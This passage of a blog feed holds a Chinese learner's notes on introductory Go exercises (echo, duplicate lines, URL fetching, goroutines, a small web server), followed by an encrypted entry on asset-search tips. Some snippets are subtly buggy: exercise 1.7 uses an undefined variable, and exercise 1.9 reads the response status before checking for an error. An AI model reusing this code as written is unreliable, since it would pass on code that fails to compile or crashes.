class="hljs-string">""</span><br><span class="hljs-keyword">var</span> s <span class="hljs-type">string</span><br><span class="hljs-keyword">var</span> s = <span class="hljs-string">""</span><br><span class="hljs-keyword">var</span> s <span class="hljs-type">string</span> = <span class="hljs-string">""</span><br></code></pre></td></tr></table></figure></li><li><p>一个简洁的写法，使用strings包的Join函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{<br>    fmt.Println(strings.Join(os.Args[<span class="hljs-number">1</span>:],<span class="hljs-string">""</span>))<br>}<br></code></pre></td></tr></table></figure></li></ul><h4 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h4><h5 id="练习-1-1"><a href="#练习-1-1" class="headerlink" title="练习 1.1"></a>练习 1.1</h5><p>修改 echo 程序，使其能够打印 os.Args[0] ，即被执行命令本身的名字。 </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">"fmt"</span><br><span class="hljs-string">"os"</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {<br><span class="hljs-keyword">var</span> s, sep <span class="hljs-type">string</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">len</span>(os.Args); i++ {<br>s += sep + os.Args[i]<br>sep = <span class="hljs-string">" "</span><br>}<br>fmt.Println(s)<br>}<br></code></pre></td></tr></table></figure><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Snipaste_2023-08-16_13-47-33.png" class=""><h5 id="练习-1-2"><a href="#练习-1-2" class="headerlink" title="练习 1.2"></a>练习 1.2</h5><p>修改 echo 程序，使其打印每个参数的索引和值，每个一行。 </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {<br><span class="hljs-keyword">for</span> n, arg := <span class="hljs-keyword">range</span> os.Args[<span class="hljs-number">1</span>:] {<br>fmt.Printf(<span class="hljs-string">"%d %s\n"</span>, n, arg)<br>}<br>}<br></code></pre></td></tr></table></figure><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Snipaste_2023-08-16_13-51-04.png" class=""><h5 id="练习-1-3"><a href="#练习-1-3" class="headerlink" title="练习 1.3"></a>练习 1.3</h5><p>做实验测量潜在低效的版本和使用了 strings.Join 的版本的运行时间差异。（1.6 节讲解了部分 time 包，11.4节展示了如何写标准测试程序，以得到系统性的性能评测。）</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {<br>   start := time.Now()<br>   <span class="hljs-comment">//测试一</span><br>   <span class="hljs-comment">//for _, arg := range os.Args[1:] {</span><br>   <span class="hljs-comment">// fmt.Printf("%s ", arg)</span><br>   <span class="hljs-comment">//}</span><br>   <span class="hljs-comment">//测试二</span><br>   fmt.Println(strings.Join(os.Args[<span class="hljs-number">1</span>:], <span class="hljs-string">" "</span>))<br>   secs := time.Since(start).Seconds()<br>   fmt.Printf(<span class="hljs-string">"花费：%.8fs"</span>, secs)<br>}<br></code></pre></td></tr></table></figure><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Snipaste_2023-08-16_14-02-15.png" class=""><p>使用<code>Join</code>函数确实可以大幅减少时间复杂度</p><h4 id="查找重复的行"><a href="#查找重复的行" class="headerlink" title="查找重复的行"></a>查找重复的行</h4><p>对文件做拷贝、打印、搜索、排序、统计或类似事情的程序都有一个差不多的程序结构：一 个处理输入的循环，在每个元素上执行计算处理，在处理的同时或最后产生输出。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {<br><span class="hljs-comment">// 创建一个映射(map)，用于存储每行文本及其出现次数</span><br>counts := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>)<br><span class="hljs-comment">// 创建一个用于从标准输入读取的扫描器</span><br>input := bufio.NewScanner(os.Stdin)<br><span class="hljs-comment">// 循环读取标准输入的每一行文本</span><br><span class="hljs-keyword">for</span> input.Scan() {<br><span class="hljs-comment">// 将当前行文本作为键，增加其对应的出现次数</span><br>counts[input.Text()]++<br>}<br><span class="hljs-comment">// 遍历映射(map)，打印出现次数大于1的行及其出现次数</span><br><span class="hljs-keyword">for</span> line, n := <span class="hljs-keyword">range</span> counts {<br><span class="hljs-keyword">if</span> n &gt; <span class="hljs-number">1</span> {<br>fmt.Printf(<span class="hljs-string">"%d\t%s\n"</span>, n, line)<br>}<br>}<br>}<br></code></pre></td></tr></table></figure><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Snipaste_2023-08-16_15-05-52.png" class=""><p>对上面的代码可以有如下理解：</p><ul><li><p><code>map</code>是存储了键值对的集合，键可以是任意类型，只要其值可以用<code>==</code>运算符比较；值可以是任意类型。上面得的代码中，键是字符串，值是整数。内置函数make创建空函数</p></li><li><p>打印结果使用<code>range</code>函数，在<code>counts</code>上迭代，每次得到键和值。需要注意的是，**<code>map</code>的遍历顺序不确定，该顺序随机，每次运行都会变化**。</p></li><li><p>关于<code>bufio</code>包，这个包使得处理输入和输出方便高效。<code>Scanner</code>类型是该包最有用的特性之 一，它读取输入并将其拆成行或单词；<strong>通常是处理行形式的输入最简单的方法</strong>。 程序使用短变量声明创建<code>bufio.Scanner</code>类型的变量<code>input</code>。读取内容由<code>input.Text()</code>获取，在读到一行时返回<code>true</code>。</p></li><li><p><code>fmt.Printf</code>函数对一些表达式产生格式化输出。该函 数的首个参数是个格式字符串，指定后续参数被如何格式化。和C语言类似。后缀<code>f</code>指<code>fomart</code>，<code>ln</code> 指<code>line</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go">%d 十进制整数<br>%x, %o, %b 十六进制，八进制，二进制整数。<br>%f, %g, %e 浮点数： <span class="hljs-number">3.141593</span> <span class="hljs-number">3.141592653589793</span> <span class="hljs-number">3.141593e+00</span><br>%t 布尔：<span class="hljs-literal">true</span>或<span class="hljs-literal">false</span><br>%c 字符（<span class="hljs-type">rune</span>） (Unicode码点)<br>%s 字符串<br>%q 带双引号的字符串<span class="hljs-string">"abc"</span>或带单引号的字符<span class="hljs-string">'c'</span><br>%v 变量的自然形式（natural format）<br>%T 变量的类型<br>%% 字面上的百分号标志（无操作数）<br></code></pre></td></tr></table></figure></li><li><p><code>fmt.Printf</code>相当于C的<code>printf</code>函数，可以格式化参数；而<code>fmt.Println</code>函数相当于C++的<code>cout</code>函数，直接输出字符串</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go">name := <span class="hljs-string">"Alice"</span><br>age := <span class="hljs-number">30</span><br>fmt.Printf(<span class="hljs-string">"Name: %s, Age: %d\n"</span>, name, age)<br>name := <span class="hljs-string">"Bob"</span><br>age := <span class="hljs-number">25</span><br>fmt.Println(<span class="hljs-string">"Name:"</span>, name, <span class="hljs-string">"Age:"</span>, age)<br></code></pre></td></tr></table></figure></li></ul><p>还有另一个方法，一口气把全部输入数据读到内存中，分割为多行，然后处理它们。这个例子引入 了<code>ReadFile</code>函数（来自于<code>io/ioutil</code>包），读取指定文件的全部内容，<code>strings.Split</code>函数把字符串分割成子串的切片。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {<br><span class="hljs-comment">// 创建一个映射(map)，用于存储每行文本及其出现次数</span><br>counts := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>)<br><span class="hljs-comment">// 循环遍历命令行参数中的每个文件名</span><br><span class="hljs-keyword">for</span> _, filename := <span class="hljs-keyword">range</span> os.Args[<span class="hljs-number">1</span>:] {<br><span class="hljs-comment">// 读取文件的内容</span><br>data, err := ioutil.ReadFile(filename)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {<br><span class="hljs-comment">// 如果读取文件发生错误，将错误信息输出到标准错误流并继续处理下一个文件</span><br>fmt.Fprintf(os.Stderr, <span class="hljs-string">"xxx:%v\n"</span>, err)<br><span class="hljs-keyword">continue</span><br>}<br><span class="hljs-comment">// 将文件内容按行拆分，并统计每行的出现次数</span><br><span class="hljs-keyword">for</span> _, line := <span class="hljs-keyword">range</span> strings.Split(<span class="hljs-type">string</span>(data), <span class="hljs-string">"\n"</span>) {<br>counts[line]++<br>}<br>}<br><span class="hljs-comment">// 遍历映射(map)，打印出现次数大于1的行及其出现次数</span><br><span class="hljs-keyword">for</span> line, n := <span class="hljs-keyword">range</span> counts {<br><span class="hljs-keyword">if</span> n &gt; <span class="hljs-number">1</span> {<br>fmt.Printf(<span class="hljs-string">"%d\t%s\n"</span>, n, line)<br>}<br>}<br>}<br></code></pre></td></tr></table></figure><p><code>ReadFile</code>函数返回一个字节切片，必须把它转换为<code>string</code>，才能 用<code>strings.Split</code>分割。实现上，<code>bufio.Scanner</code>、<code>ioutil.ReadFile</code>和<code>ioutil.WriteFile</code>都使 用<code>*os.File</code>的<code>Read</code>和<code>Write</code>方法，但是，大多数程序员很少需要直接调用那些低级函数。</p><h4 id="获取URL"><a href="#获取URL" class="headerlink" title="获取URL"></a>获取URL</h4><p>Go语言在<code>net</code>这 个强大<code>package</code>的帮助下提供了一系列的<code>package</code>来做这件事情，使用这些包可以更简单地用 网络收发信息，还可以建立更底层的网络连接，编写服务器程序。</p><p>下面是一个使用示例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {<br><span class="hljs-comment">// 循环遍历命令行参数中的每个URL</span><br><span class="hljs-keyword">for</span> _, url := <span class="hljs-keyword">range</span> os.Args[<span class="hljs-number">1</span>:] {<br><span class="hljs-comment">// 使用HTTP GET请求获取URL的响应</span><br>resp, err := http.Get(url)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {<br><span class="hljs-comment">// 如果发生错误，将错误信息输出到标准错误流并退出程序</span><br>fmt.Fprintf(os.Stderr, <span class="hljs-string">"fetch:%v\n"</span>, err)<br>os.Exit(<span class="hljs-number">1</span>)<br>}<br><span class="hljs-comment">// 读取响应体的内容</span><br>b, err := ioutil.ReadAll(resp.Body)<br>resp.Body.Close()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {<br><span class="hljs-comment">// 如果在读取过程中发生错误，将错误信息输出到标准错误流并退出程序</span><br>fmt.Fprintf(os.Stderr, <span class="hljs-string">"fetch: reading %s: %v\n"</span>, url, err)<br>os.Exit(<span class="hljs-number">1</span>)<br>}<br><span class="hljs-comment">// 将获取到的内容输出到标准输出</span><br>fmt.Printf(<span class="hljs-string">"%s"</span>, b)<br>}<br>}<br></code></pre></td></tr></table></figure><p>在文件资源目录下使用终端，命令：<code>go run hello.go http://remixxyh.github.io</code></p><h4 id="练习-1"><a href="#练习-1" class="headerlink" title="练习"></a>练习</h4><h5 id="练习1-7"><a href="#练习1-7" class="headerlink" title="练习1.7"></a>练习1.7</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {<br>   <span class="hljs-keyword">for</span> _, url := <span class="hljs-keyword">range</span> os.Args[<span class="hljs-number">1</span>:] {<br>      resp, err := http.Get(url)<br>      <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {<br>         fmt.Fprintf(os.Stderr, <span class="hljs-string">"fetch:%v\n"</span>, err)<br>         os.Exit(<span class="hljs-number">1</span>)<br>      }<br>      _, err = io.Copy(os.Stdout, resp.Body)<br>      resp.Body.Close()<br>      <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {<br>         fmt.Fprintf(os.Stderr, <span class="hljs-string">"fetch: reading %s: %v\n"</span>, url, err)<br>         os.Exit(<span class="hljs-number">1</span>)<br>      }<br>      fmt.Printf(<span class="hljs-string">"%s"</span>, b)<br>   }<br>}<br></code></pre></td></tr></table></figure><p>这里使用<code>io.Copy</code>函数，是题目所给的将内容直接拷贝到标准输出中，将 <code>io.Copy</code> 的返回值存储在一个匿名变量 <code>_</code> 中，因为我们主要关心错误处理，而不是复制的字节数。</p><h5 id="练习1-8"><a href="#练习1-8" class="headerlink" title="练习1.8"></a>练习1.8</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {<br>   <span class="hljs-keyword">for</span> _, url := <span class="hljs-keyword">range</span> os.Args[<span class="hljs-number">1</span>:] {<br>      <span class="hljs-keyword">if</span> !strings.HasPrefix(url, <span class="hljs-string">"http://"</span>) {<br>         url = <span class="hljs-string">"http://"</span> + url<br>      }<br>      resp, err := http.Get(url)<br>      <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {<br>         fmt.Fprintf(os.Stderr, <span class="hljs-string">"fetch:%v\n"</span>, err)<br>         os.Exit(<span class="hljs-number">1</span>)<br>      }<br>      _, err = io.Copy(os.Stdout, resp.Body)<br>      resp.Body.Close()<br>      <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {<br>         fmt.Fprintf(os.Stderr, <span class="hljs-string">"fetch: reading %s: %v\n"</span>, url, err)<br>         os.Exit(<span class="hljs-number">1</span>)<br>      }<br>   }<br>}<br></code></pre></td></tr></table></figure><h5 id="练习1-9"><a href="#练习1-9" class="headerlink" title="练习1.9"></a>练习1.9</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {<br>   <span class="hljs-keyword">for</span> _, url := <span class="hljs-keyword">range</span> os.Args[<span class="hljs-number">1</span>:] {<br>      <span class="hljs-keyword">if</span> !strings.HasPrefix(url, <span class="hljs-string">"http://"</span>) {<br>         url = <span class="hljs-string">"https://"</span> + url<br>      }<br>      resp, err := http.Get(url)<br>      fmt.Printf(resp.Status)<br>      <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {<br>         fmt.Fprintf(os.Stderr, <span class="hljs-string">"fetch:%v\n"</span>, err)<br>         os.Exit(<span class="hljs-number">1</span>)<br>      }<br>      _, err = io.Copy(os.Stdout, resp.Body)<br>      resp.Body.Close()<br>      <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {<br>         fmt.Fprintf(os.Stderr, <span class="hljs-string">"fetch: reading %s: %v\n"</span>, url, err)<br>         os.Exit(<span class="hljs-number">1</span>)<br>      }<br>   }<br>}<br></code></pre></td></tr></table></figure><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Snipaste_2023-08-18_20-21-57.png" class=""><h4 id="并发获取多个URL"><a href="#并发获取多个URL" class="headerlink" title="并发获取多个URL"></a>并发获取多个URL</h4><p>Go语言最有意思并且最新奇的特性就是对并发编程的支持</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {<br>start := time.Now()<br>ch := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>)<br><span class="hljs-keyword">for</span> _, url := <span class="hljs-keyword">range</span> os.Args[<span class="hljs-number">1</span>:] {<br><span class="hljs-keyword">go</span> fetch(url, ch)<br>}<br><span class="hljs-keyword">for</span> <span class="hljs-keyword">range</span> os.Args[<span class="hljs-number">1</span>:] {<br>fmt.Println(&lt;-ch)<br>}<br>fmt.Printf(<span class="hljs-string">"%.2fs elapsed\n"</span>, time.Since(start).Seconds())<br>}<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">fetch</span><span class="hljs-params">(url <span class="hljs-type">string</span>, ch <span class="hljs-keyword">chan</span>&lt;- <span class="hljs-type">string</span>)</span></span> {<br>start := time.Now()<br>resp, err := http.Get(url)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {<br>ch &lt;- fmt.Sprint(err)<br><span class="hljs-keyword">return</span><br>}<br>nbytes, err := io.Copy(ioutil.Discard, resp.Body)<br>resp.Body.Close()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {<br>ch &lt;- fmt.Sprintf(<span class="hljs-string">"while reading %s: %v"</span>, url, err)<br><span class="hljs-keyword">return</span><br>}<br>secs := time.Since(start).Seconds()<br>ch &lt;- fmt.Sprintf(<span class="hljs-string">"%.2fs %7d %s"</span>, secs, nbytes, url)<br>}<br></code></pre></td></tr></table></figure><p>在<code>terminal</code>里执行：<code>go run hello.go https://www.baidu.com http://gopl.io https://remixxyh.github.io</code></p><p>将会得到：</p><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Snipaste_2023-08-31_15-53-48.png" class=""><p>我们可以发现整个程序执行的时间由获取请求最长的那个决定</p><p>这是一个并发请求的程序，分析上面的代码：</p><ul><li><code>ch := make(chan string)</code>是一个用于在<code>Goroutine</code>之间传递数据的管道，每当<code>fetch</code>函数执行完毕后，它会将一个带有消息的字符串发送到通道中</li><li><code>Goroutine</code>是一种函数的并发执行方式，<code>main</code>函数本身也运行在一个<code>goroutine</code>中，而<code>go function</code>则表示创建一个新的goroutine，并在这个新的goroutine中执行这个函数</li><li>这个程序里会异步执行<code>Get</code>方法，将<code>Body</code>拷贝到<code>ioutil.Discard</code>（可以把这个变量看成一个垃圾桶）输出流中，<code>io.Copy</code>函数会返回两个值(复制的字节数和可能的错误)，从而实现不处理<code>Body</code>，得到响应体的字节数</li><li><strong>在使用通道发送或者接收数据时，如果此时通道已满或者主函数<code>main</code>没有做好接收的准备（注意：<code>main</code>函数也是一个<code>Goroutine</code>），那么会在发送数据的<code>Goroutine</code>那里阻塞，这个例子中就是<code>fetch</code>函数；如果通道为空或者没有数据可以使用，那么会在接收数据的<code>Goroutine</code>那里阻塞。所以这个例子在<code>main</code>使用一个<code>for</code>循环接收数据，是为了防止主函数执行完了但是<code>fetch</code>还没有执行完</strong>。</li></ul><h4 id="Web服务"><a href="#Web服务" class="headerlink" title="Web服务"></a>Web服务</h4><p>Go语言的内置库使得写一个类似fetch的web服务器变得异常地简单。在本节中，我们会展示 一个微型服务器，这个服务器的功能是返回当前用户正在访问的URL。比如用户访问的是 <a href="http://localhost:8000/hello">http://localhost:8000/hello</a> ，那么响应是URL.Path = “hello”。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {<br>http.HandleFunc(<span class="hljs-string">"/"</span>, handler)<br>log.Fatal(http.ListenAndServe(<span class="hljs-string">"localhost:8000"</span>, <span class="hljs-literal">nil</span>))<br>}<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">handler</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> {<br>fmt.Fprintf(w, <span class="hljs-string">"URL.Path = %q\n"</span>, r.URL.Path)<br>}<br></code></pre></td></tr></table></figure><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Snipaste_2023-09-01_14-09-52.png" class=""><p>在浏览器里访问：</p><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Snipaste_2023-09-01_14-08-41.png" class=""><p>多个控制器：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> mu sync.Mutex<br><span class="hljs-keyword">var</span> count <span class="hljs-type">int</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {<br>http.HandleFunc(<span class="hljs-string">"/"</span>, handler)<br>http.HandleFunc(<span class="hljs-string">"/count"</span>, counter)<br>log.Fatal(http.ListenAndServe(<span class="hljs-string">"localhost:8000"</span>, <span class="hljs-literal">nil</span>))<br>}<br><br><span class="hljs-comment">// handler echoes the Path component of the requested URL.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">handler</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> {<br>mu.Lock()<br>count++<br>mu.Unlock()<br>fmt.Fprintf(w, <span class="hljs-string">"URL.Path = %q\n"</span>, r.URL.Path)<br>}<br><br><span class="hljs-comment">// counter echoes the number of calls so far.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">counter</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> {<br>mu.Lock()<br>fmt.Fprintf(w, <span class="hljs-string">"Count %d\n"</span>, count)<br>mu.Unlock()<br>}<br></code></pre></td></tr></table></figure><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Snipaste_2023-09-01_14-15-13.png" class=""><p>在这些代码的背后，服务器每一 次接收请求处理时都会另起一个<code>goroutine</code>，这样服务器就可以同一时间处理多个请求。在并发情况下，两个请求同一时刻去更新<code>count</code>，那么这个值可能并不会被正确地 增加；这个程序可能会引发一个严重的<code>bug</code>：竞态条件。</p><p><strong>为了避免这个问题，我们必须保证每次修改变量的最多只能有一个<code>goroutine</code>，这也就是代码里的<code>mu.Lock()</code>和 <code>mu.Unlock()</code>调用将修改<code>count</code>的所有行为包在中间的目的。</strong></p><p>第一章的学习就到这里，入门了GO👍👍👍</p>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>读书笔记</tag>
      
      <tag>Golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>搜索测绘资产技巧</title>
    <link href="/2023/08/14/%E6%90%9C%E7%B4%A2%E6%B5%8B%E7%BB%98%E8%B5%84%E4%BA%A7%E6%8A%80%E5%B7%A7/"/>
    <url>/2023/08/14/%E6%90%9C%E7%B4%A2%E6%B5%8B%E7%BB%98%E8%B5%84%E4%BA%A7%E6%8A%80%E5%B7%A7/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="082b90780c1aba816116f2017b7dd1c1f8c4d0505d41235a56541835acc31043"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>SRC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SRC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>博弈程序编写</title>
    <link href="/2023/04/24/%E5%8D%9A%E5%BC%88%E7%A8%8B%E5%BA%8F%E7%BC%96%E5%86%99%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/04/24/%E5%8D%9A%E5%BC%88%E7%A8%8B%E5%BA%8F%E7%BC%96%E5%86%99%E5%9F%BA%E7%A1%80/</url>
    
